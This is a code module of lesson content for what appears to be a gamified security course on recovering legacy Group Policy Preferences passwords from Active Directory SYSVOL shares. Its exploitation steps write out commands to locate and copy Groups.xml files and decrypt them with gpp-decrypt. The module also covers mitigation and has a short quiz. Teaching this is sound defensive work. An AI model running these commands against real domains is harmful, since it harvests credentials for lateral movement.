export const gppPasswordsTheory = {
  id: 'gpp-passwords',
  title: 'Group Policy Preferences (GPP) Passwords',
  subtitle: 'Recover passwords from legacy GPP files',
  estimatedTime: '8 minutes',
  difficulty: 'Intermediate',
  xpReward: 110,
  
  sections: [
    {
      id: 'intro',
      title: '🎯 What is GPP Password Leak?',
      type: 'intro',
      duration: '2 min',
      content: `Group Policy Preferences before 2014 stored passwords in XML files encrypted with a known key. Attackers can retrieve and decrypt these to get cleartext passwords.`,
      keyPoints: [
        'Legacy issue affecting GPP',
        'Passwords encrypted with known AES key',
        'Easily decrypted with publicly known keys',
        'Provides privilege escalation vectors'
      ]
    },
    {
      id: 'discovery',
      title: '🔍 How to Discover GPP Passwords',
      type: 'concept',
      duration: '3 min',
      content: `Attackers search SYSVOL for XML files like Groups.xml, ScheduledTasks.xml, etc., containing encrypted passwords.`,
      example: {
        title: 'PowerShell Discovery',
        code: `Get-ChildItem '\\domain.com\SYSVOL\domain.com\Policies\*' -Include Groups.xml -Recurse`
      }
    },
    {
      id: 'exploitation',
      title: '⚔️ Exploiting GPP Passwords',
      type: 'steps',
      duration: '3 min',
      steps: [
        {
          number: 1,
          title: 'Download GPP Files',
          description: 'Retrieve XML files containing encrypted passwords',
          commands: [
            'copy \\domain.com\SYSVOL\domain.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml .'
          ]
        },
        {
          number: 2,
          title: 'Decrypt Passwords',
          description: 'Use publicly available keys/tools to decrypt',
          commands: [
            'gpp-decrypt -f Groups.xml'
          ]
        },
        {
          number: 3,
          title: 'Use Credentials',
          description: 'Use extracted credentials for lateral movement',
          commands: []
        }
      ]
    },
    {
      id: 'defense',
      title: '🛡️ Mitigation',
      type: 'defensive',
      duration: '2 min',
      content: `Ensure all legacy GPP password usage is eradicated, and fallback to modern management.`,
      prevention: [
        {
          title: 'Remove Legacy GPP Passwords',
          description: 'Audit SYSVOL and remove XML password files',
          example: 'Use Group Policy Management Console to detect legacy settings'
        },
        {
          title: 'Restrict SYSVOL Access',
          description: 'Limit who can read SYSVOL shares',
          example: 'Use ACLs to secure SYSVOL'
        }
      ]
    }
  ],
  
  quiz: [
    {
      question: 'What is the main risk with legacy GPP passwords?',
      options: [
        'Stored in plaintext',
        'Encrypted with known key',
        'Encrypted with user-specific keys',
        'Stored in the registry'
      ],
      correct: 1,
      explanation: 'GPP passwords were encrypted with a publicly known AES key, allowing easy decryption.'
    }
  ],
  
  resources: [
    {
      title: 'Microsoft Security Advisory on GPP',
      url: 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025',
      type: 'reference'
    },
    {
      title: 'GPP Decrypt Tool',
      url: 'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1',
      type: 'tool'
    }
  ]
};
